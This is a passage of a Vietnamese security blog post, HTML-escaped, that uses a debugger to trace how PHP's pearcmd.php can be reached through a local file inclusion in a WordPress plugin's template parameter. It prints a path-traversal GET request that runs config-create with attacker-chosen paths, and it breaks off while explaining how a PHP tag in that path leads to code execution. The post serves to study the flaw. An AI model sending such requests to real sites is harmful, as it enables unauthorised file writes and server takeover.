vào.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;pearcmd-code-analysis&#34;&gt;&lt;span&gt;&lt;code&gt;pearcmd&lt;/code&gt; Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#pearcmd-code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Trước khi phân tích mã nguồn của &lt;code&gt;/usr/local/lib/php/pearcmd.php&lt;/code&gt;, cần thiết lập môi trường debug để nắm rõ luồng thực thi - tham khảo: &lt;a href=&#34;https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;Sau đó hãy copy toàn bộ mã nguồn &lt;strong&gt;php&lt;/strong&gt; từ container về máy thật, giữ nguyên cấu trúc thư mục, để khi debugger dừng tại &lt;code&gt;/usr/local/lib/php/pearcmd.php&lt;/code&gt; bạn vẫn có thể mở và theo dõi file tương ứng với container:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo docker cp wordpress:/usr/local/lib/php/ /usr/local/lib/php/&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;require_once &amp;#39;PEAR.php&amp;#39;;&#xA;require_once &amp;#39;PEAR/Frontend.php&amp;#39;;&#xA;require_once &amp;#39;PEAR/Config.php&amp;#39;;&#xA;require_once &amp;#39;PEAR/Command.php&amp;#39;;&#xA;require_once &amp;#39;Console/Getopt.php&amp;#39;;&#xA;&#xA;$all_commands = PEAR_Command::getCommands();&#xA;...&#xA;$argv = Console_Getopt::readPHPArgv();&#xA;...&#xA;$options = Console_Getopt::getopt2($argv, &amp;#34;c:C:d:D:Gh?sSqu:vV&amp;#34;);&#xA;array_shift($argv);&#xA;...&#xA;$command = (isset($options[1][0])) ? $options[1][0] : null;&#xA;...&#xA;if ($fetype == &amp;#39;Gtk2&amp;#39;) {&#xA;    ...&#xA;} else {&#xA;    do {&#xA;        ...&#xA;        $cmd = PEAR_Command::factory($command, $config);&#xA;        ...&#xA;        list($tmpopt, $params) = $tmp;&#xA;        ...&#xA;        $ok = $cmd-&amp;gt;run($command, $opts, $params);&#xA;        if ($ok === false) {&#xA;            PEAR::raiseError(&amp;#34;unknown command `$command&amp;#39;&amp;#34;);&#xA;        }&#xA;        ...&#xA;    } while (false);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đầu tiên, tất cả các command sẽ được load vào &lt;code&gt;$all_commands&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$all_commands = PEAR_Command::getCommands();&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public static function getCommands()&#xA;{&#xA;    if (empty($GLOBALS[&amp;#39;_PEAR_Command_commandlist&amp;#39;])) {&#xA;        PEAR_Command::registerCommands();&#xA;    }&#xA;    return $GLOBALS[&amp;#39;_PEAR_Command_commandlist&amp;#39;];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;getCommands()&lt;/code&gt; gọi đến &lt;code&gt;registerCommands()&lt;/code&gt; để đăng ký các command.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png&#34; title=&#34;Tất cả các command được load vào `$all_commands`&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png&#34; data-sub-html=&#34;&lt;h2&gt;all_commands&lt;/h2&gt;&lt;p&gt;Tất cả các command được load vào `$all_commands`&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png&#39; alt=&#34;all_commands&#34; height=&#34;390&#34; width=&#34;362&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tất cả các command được load vào `$all_commands`&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Sau đó &lt;code&gt;$argv&lt;/code&gt; được khởi tạo&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$argv = Console_Getopt::readPHPArgv();&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public static function readPHPArgv()&#xA;{&#xA;    global $argv;&#xA;    if (!is_array($argv)) {&#xA;        if (!@is_array($_SERVER[&amp;#39;argv&amp;#39;])) {&#xA;            if (!@is_array($GLOBALS[&amp;#39;HTTP_SERVER_VARS&amp;#39;][&amp;#39;argv&amp;#39;])) {&#xA;                $msg = &amp;#34;Could not read cmd args (register_argc_argv=Off?)&amp;#34;;&#xA;                return PEAR::raiseError(&amp;#34;Console_Getopt: &amp;#34; . $msg);&#xA;            }&#xA;            return $GLOBALS[&amp;#39;HTTP_SERVER_VARS&amp;#39;][&amp;#39;argv&amp;#39;];&#xA;        }&#xA;        return $_SERVER[&amp;#39;argv&amp;#39;];&#xA;    }&#xA;    return $argv;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu &lt;code&gt;$argv&lt;/code&gt; không phải mảng (tức là không có dữ liệu hợp lệ), hàm sẽ cố gắng tìm giá trị tương đương ở &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt; và trả về, tức các &lt;code&gt;search-word&lt;/code&gt; đường ta truyền trong URL. ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=geo_mashup_query&amp;amp;object_ids=2&amp;amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;amp;&amp;#43;config-create&amp;#43;/test_root_path&amp;#43;test_filename.php HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Quan sát trong debugger:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png&#34; title=&#34;Giá trị của `$argv` trong debugger&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png&#34; data-sub-html=&#34;&lt;h2&gt;argv1&lt;/h2&gt;&lt;p&gt;Giá trị của `$argv` trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png&#39; alt=&#34;argv1&#34; height=&#34;156&#34; width=&#34;1634&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Giá trị của `$argv` trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ngay sau đó &lt;code&gt;$argv&lt;/code&gt; sẽ được loại bỏ phần tử thứ nhất rồi trở thành đối số của &lt;code&gt;Console_Getopt::getopt2()&lt;/code&gt;, gía trị trả về gán cho &lt;code&gt;$options&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;array_shift($argv);&#xA;$options = Console_Getopt::getopt2($argv, &amp;#34;c:C:d:D:Gh?sSqu:vV&amp;#34;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Giá trị bây giờ là:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png&#34; title=&#34;Giá trị của `$argv` và `$options` trong debugger&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png&#34; data-sub-html=&#34;&lt;h2&gt;argv_options&lt;/h2&gt;&lt;p&gt;Giá trị của `$argv` và `$options` trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png&#39; alt=&#34;argv_options&#34; height=&#34;244&#34; width=&#34;1634&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Giá trị của `$argv` và `$options` trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Biến &lt;code&gt;$command&lt;/code&gt; được khởi tạo với giá trị &lt;code&gt;$options[1][0]&lt;/code&gt; tức &lt;code&gt;config-create&lt;/code&gt; trong trường hợp này.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$command = (isset($options[1][0])) ? $options[1][0] : null;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau đó 1 &lt;code&gt;factory&lt;/code&gt; được tạo và gán vào &lt;code&gt;$cmd&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$cmd = PEAR_Command::factory($command, $config);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi hover vào &lt;code&gt;$cmd&lt;/code&gt; ta thấy được các tham số yêu cầu của lệnh &lt;code&gt;config-create&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png&#34; title=&#34;Các tham số yêu cầu của lệnh `config-create`&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png&#34; data-sub-html=&#34;&lt;h2&gt;doc&lt;/h2&gt;&lt;p&gt;Các tham số yêu cầu của lệnh `config-create`&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png&#39; alt=&#34;doc&#34; height=&#34;424&#34; width=&#34;861&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Các tham số yêu cầu của lệnh `config-create`&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Và đặc biệt, ta thấy hàm thực thi cho &lt;code&gt;config-create&lt;/code&gt; là &lt;code&gt;doConfigCreate&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function doConfigCreate($command, $options, $params)&#xA;{&#xA;    if (count($params) != 2) {&#xA;        return PEAR::raiseError(&amp;#39;config-create: must have 2 parameters, root path and &amp;#39; .&#xA;            &amp;#39;filename to save as&amp;#39;);&#xA;    }&#xA;&#xA;    $root = $params[0];&#xA;    // Clean up the DIRECTORY_SEPARATOR mess&#xA;    $ds2 = DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR;&#xA;    $root = preg_replace(array(&amp;#39;!\\\\&amp;#43;!&amp;#39;, &amp;#39;!/&amp;#43;!&amp;#39;, &amp;#34;!$ds2&amp;#43;!&amp;#34;),&#xA;                            array(&amp;#39;/&amp;#39;, &amp;#39;/&amp;#39;, &amp;#39;/&amp;#39;),&#xA;                        $root);&#xA;    if ($root[0] != &amp;#39;/&amp;#39;) {&#xA;        if (!isset($options[&amp;#39;windows&amp;#39;])) {&#xA;            return PEAR::raiseError(&amp;#39;Root directory must be an absolute path beginning &amp;#39; .&#xA;                &amp;#39;with &amp;#34;/&amp;#34;, was: &amp;#34;&amp;#39; . $root . &amp;#39;&amp;#34;&amp;#39;);&#xA;        }&#xA;&#xA;        if (!preg_match(&amp;#39;/^[A-Za-z]:/&amp;#39;, $root)) {&#xA;            return PEAR::raiseError(&amp;#39;Root directory must be an absolute path beginning &amp;#39; .&#xA;                &amp;#39;with &amp;#34;\\&amp;#34; or &amp;#34;C:\\&amp;#34;, was: &amp;#34;&amp;#39; . $root . &amp;#39;&amp;#34;&amp;#39;);&#xA;        }&#xA;    }&#xA;&#xA;    $windows = isset($options[&amp;#39;windows&amp;#39;]);&#xA;    if ($windows) {&#xA;        $root = str_replace(&amp;#39;/&amp;#39;, &amp;#39;\\&amp;#39;, $root);&#xA;    }&#xA;&#xA;    if (!file_exists($params[1]) &amp;amp;&amp;amp; !@touch($params[1])) {&#xA;        return PEAR::raiseError(&amp;#39;Could not create &amp;#34;&amp;#39; . $params[1] . &amp;#39;&amp;#34;&amp;#39;);&#xA;    }&#xA;&#xA;    $params[1] = realpath($params[1]);&#xA;    $config = new PEAR_Config($params[1], &amp;#39;#no#system#config#&amp;#39;, false, false);&#xA;    if ($root[strlen($root) - 1] == &amp;#39;/&amp;#39;) {&#xA;        $root = substr($root, 0, strlen($root) - 1);&#xA;    }&#xA;&#xA;    $config-&amp;gt;noRegistry();&#xA;    $config-&amp;gt;set(&amp;#39;php_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\php&amp;#34; : &amp;#34;$root/pear/php&amp;#34;, &amp;#39;user&amp;#39;);&#xA;    $config-&amp;gt;set(&amp;#39;data_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\data&amp;#34; : &amp;#34;$root/pear/data&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;www_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\www&amp;#34; : &amp;#34;$root/pear/www&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;cfg_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\cfg&amp;#34; : &amp;#34;$root/pear/cfg&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;ext_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\ext&amp;#34; : &amp;#34;$root/pear/ext&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;doc_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\docs&amp;#34; : &amp;#34;$root/pear/docs&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;test_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\tests&amp;#34; : &amp;#34;$root/pear/tests&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;cache_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\cache&amp;#34; : &amp;#34;$root/pear/cache&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;download_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\download&amp;#34; : &amp;#34;$root/pear/download&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;temp_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\temp&amp;#34; : &amp;#34;$root/pear/temp&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;bin_dir&amp;#39;, $windows ? &amp;#34;$root\\pear&amp;#34; : &amp;#34;$root/pear&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;man_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\man&amp;#34; : &amp;#34;$root/pear/man&amp;#34;);&#xA;    $config-&amp;gt;writeConfigFile();&#xA;    $this-&amp;gt;_showConfig($config);&#xA;    $this-&amp;gt;ui-&amp;gt;outputData(&amp;#39;Successfully created default configuration file &amp;#34;&amp;#39; . $params[1] . &amp;#39;&amp;#34;&amp;#39;,&#xA;        $command);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm bắt buộc phải nhận đúng 2 tham số: &lt;code&gt;root path&lt;/code&gt; và &lt;code&gt;filename&lt;/code&gt;. Nếu không, trả về lỗi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (count($params) != 2) {&#xA;    return PEAR::raiseError(&amp;#39;config-create: must have 2 parameters, root path and &amp;#39; .&#xA;        &amp;#39;filename to save as&amp;#39;);&#xA;}&#xA;$root = $params[0];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu ký tự đầu tiên của root path không phải là &lt;code&gt;/&lt;/code&gt;, hàm kiểm tra xem có bật tuỳ chọn windows không.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($root[0] != &amp;#39;/&amp;#39;) {&#xA;    if (!isset($options[&amp;#39;windows&amp;#39;])) {&#xA;        return PEAR::raiseError(&amp;#39;Root directory must be an absolute path beginning &amp;#39; .&#xA;            &amp;#39;with &amp;#34;/&amp;#34;, was: &amp;#34;&amp;#39; . $root . &amp;#39;&amp;#34;&amp;#39;);&#xA;    }&#xA;&#xA;    if (!preg_match(&amp;#39;/^[A-Za-z]:/&amp;#39;, $root)) {&#xA;        return PEAR::raiseError(&amp;#39;Root directory must be an absolute path beginning &amp;#39; .&#xA;            &amp;#39;with &amp;#34;\\&amp;#34; or &amp;#34;C:\\&amp;#34;, was: &amp;#34;&amp;#39; . $root . &amp;#39;&amp;#34;&amp;#39;);&#xA;    }&#xA;}&#xA;$windows = isset($options[&amp;#39;windows&amp;#39;]);&#xA;if ($windows) {&#xA;    $root = str_replace(&amp;#39;/&amp;#39;, &amp;#39;\\&amp;#39;, $root);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nếu không phải &lt;code&gt;Windows&lt;/code&gt; → bắt lỗi vì yêu cầu đường dẫn bắt đầu bằng &lt;code&gt;/&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu là &lt;code&gt;Windows&lt;/code&gt; → kiểm tra định dạng &lt;code&gt;C:&lt;/code&gt; (thông qua regex) và chuyển dấu &lt;code&gt;/&lt;/code&gt; thành &lt;code&gt;\&lt;/code&gt; nếu cần.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Sau đó, thực hiện tạo và kiểm tra file cấu hình đầu ra&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!file_exists($params[1]) &amp;amp;&amp;amp; !@touch($params[1])) {&#xA;    return PEAR::raiseError(&amp;#39;Could not create &amp;#34;&amp;#39; . $params[1] . &amp;#39;&amp;#34;&amp;#39;);&#xA;}&#xA;$params[1] = realpath($params[1]);&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nếu file chưa tồn tại, cố gắng tạo bằng &lt;code&gt;touch&lt;/code&gt;. Nếu không tạo được → lỗi.&lt;/li&gt;&#xA;&lt;li&gt;Dùng &lt;code&gt;realpath&lt;/code&gt; để lấy đường dẫn tuyệt đối thật sự của file.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tạo đối tượng cấu hình và chuẩn hoá $root&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$config = new PEAR_Config($params[1], &amp;#39;#no#system#config#&amp;#39;, false, false);&#xA;if ($root[strlen($root) - 1] == &amp;#39;/&amp;#39;) {&#xA;    $root = substr($root, 0, strlen($root) - 1);&#xA;}&#xA;$config-&amp;gt;noRegistry();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thiết lập các giá trị đường dẫn&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$config-&amp;gt;set(&amp;#39;php_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\php&amp;#34; : &amp;#34;$root/pear/php&amp;#34;, &amp;#39;user&amp;#39;);&#xA;$config-&amp;gt;set(&amp;#39;data_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\data&amp;#34; : &amp;#34;$root/pear/data&amp;#34;);&#xA;...&#xA;$config-&amp;gt;set(&amp;#39;man_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\man&amp;#34; : &amp;#34;$root/pear/man&amp;#34;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cuối cùng là ghi file cấu hình, hiển thị và thông báo thành công&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$config-&amp;gt;writeConfigFile();&#xA;$this-&amp;gt;_showConfig($config);&#xA;$this-&amp;gt;ui-&amp;gt;outputData(&amp;#39;Successfully created default configuration file &amp;#34;&amp;#39; . $params[1] . &amp;#39;&amp;#34;&amp;#39;,&#xA;    $command);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;writeConfigFile()&lt;/code&gt; là hàm chính dùng để ghi dữ liệu vào config file.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function writeConfigFile($file = null, $layer = &amp;#39;user&amp;#39;, $data = null)&#xA;{&#xA;    $this-&amp;gt;_lazyChannelSetup($layer);&#xA;    if ($layer == &amp;#39;both&amp;#39; || $layer == &amp;#39;all&amp;#39;) {&#xA;        foreach ($this-&amp;gt;files as $type =&amp;gt; $file) {&#xA;            $err = $this-&amp;gt;writeConfigFile($file, $type, $data);&#xA;            if (PEAR::isError($err)) {&#xA;                return $err;&#xA;            }&#xA;        }&#xA;        return true;&#xA;    }&#xA;&#xA;    if (empty($this-&amp;gt;files[$layer])) {&#xA;        return $this-&amp;gt;raiseError(&amp;#34;unknown config file type `$layer&amp;#39;&amp;#34;);&#xA;    }&#xA;&#xA;    if ($file === null) {&#xA;        $file = $this-&amp;gt;files[$layer];&#xA;    }&#xA;&#xA;    $data = ($data === null) ? $this-&amp;gt;configuration[$layer] : $data;&#xA;    $this-&amp;gt;_encodeOutput($data);&#xA;    $opt = array(&amp;#39;-p&amp;#39;, dirname($file));&#xA;    if (!@System::mkDir($opt)) {&#xA;        return $this-&amp;gt;raiseError(&amp;#34;could not create directory: &amp;#34; . dirname($file));&#xA;    }&#xA;&#xA;    if (file_exists($file) &amp;amp;&amp;amp; is_file($file) &amp;amp;&amp;amp; !is_writeable($file)) {&#xA;        return $this-&amp;gt;raiseError(&amp;#34;no write access to $file!&amp;#34;);&#xA;    }&#xA;&#xA;    $fp = @fopen($file, &amp;#34;w&amp;#34;);&#xA;    if (!$fp) {&#xA;        return $this-&amp;gt;raiseError(&amp;#34;PEAR_Config::writeConfigFile fopen(&amp;#39;$file&amp;#39;,&amp;#39;w&amp;#39;) failed ($php_errormsg)&amp;#34;);&#xA;    }&#xA;&#xA;    $contents = &amp;#34;#PEAR_Config 0.9\n&amp;#34; . serialize($data);&#xA;    if (!@fwrite($fp, $contents)) {&#xA;        return $this-&amp;gt;raiseError(&amp;#34;PEAR_Config::writeConfigFile: fwrite failed ($php_errormsg)&amp;#34;);&#xA;    }&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đây là hàm quyết định việc ghi config file với &lt;code&gt;serialize($data)&lt;/code&gt; để chuyển cấu hình thành chuỗi có thể lưu trữ.&lt;/p&gt;&#xA;&lt;p&gt;Trở lại file &lt;code&gt;pearcmd.php&lt;/code&gt;, các param được tạo và gán vào &lt;code&gt;$params&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;list($tmpopt, $params) = $tmp;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png&#34; title=&#34;Giá trị $params trong debugger&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png&#34; data-sub-html=&#34;&lt;h2&gt;params&lt;/h2&gt;&lt;p&gt;Giá trị $params trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png&#39; alt=&#34;params&#34; height=&#34;244&#34; width=&#34;1634&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Giá trị $params trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Cuối cùng, &lt;code&gt;$cmd&lt;/code&gt; được thực thi bằng &lt;code&gt;$cmd-&amp;gt;run()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$ok = $cmd-&amp;gt;run($command, $opts, $params);&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Gửi GET request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=geo_mashup_query&amp;amp;object_ids=2&amp;amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;amp;&amp;#43;config-create&amp;#43;/test_root_path&amp;#43;test_filename.php&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Web &lt;code&gt;include&lt;/code&gt; &lt;code&gt;/usr/local/lib/php/pearcmd.php&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;PHP (register_argc_argv=On) build &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt; từ query → &lt;code&gt;[&#39;action=geo_mashup_query&amp;amp;object_ids=2&amp;amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;amp;&#39;,&#39;config-create&#39;,&#39;/test_root_path&#39;,&#39;test_filename.php&#39;]&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;Console_Getopt::readPHPArgv()&lt;/code&gt; trả &lt;code&gt;$argv&lt;/code&gt;; &lt;code&gt;Console_Getopt::getopt2()&lt;/code&gt; parse ra &lt;code&gt;$command=&#39;config-create&#39;&lt;/code&gt; và &lt;code&gt;list($tmpopt, $params)&lt;/code&gt; trả về &lt;code&gt;$params=[&#39;/test_root_path&#39;,&#39;test_filename.php&#39;]&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;doConfigCreate()&lt;/code&gt; chạy với &lt;code&gt;$params&lt;/code&gt; do attacker kiểm soát → &lt;code&gt;touch()&lt;/code&gt;/&lt;code&gt;realpath()&lt;/code&gt; và &lt;code&gt;writeConfigFile()&lt;/code&gt; tạo/ghi file.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;File cấu hình được tạo có chứa giá trị &lt;code&gt;root path&lt;/code&gt;. Nếu giá trị này bị ghi dưới dạng một thẻ PHP hợp lệ (&lt;code&gt;&amp;lt;?php ... ?&amp;gt;&lt;/code&gt;) và &lt;code&gt;file&lt;/code&gt; có thể được truy cập bởi client, webserver sẽ xử lý nội dung 